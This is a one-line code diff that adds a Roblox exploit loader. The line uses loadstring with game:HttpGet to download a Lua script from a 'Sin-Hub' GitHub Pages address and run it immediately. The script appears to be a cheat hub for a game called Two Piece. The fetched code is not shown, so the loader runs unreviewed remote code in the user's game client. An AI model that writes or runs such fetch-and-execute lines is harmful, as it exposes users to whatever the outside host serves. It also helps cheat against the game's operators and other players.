@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sinnyno1.github.io/Sin-Hub/Script/TwoPiece.lua"))();
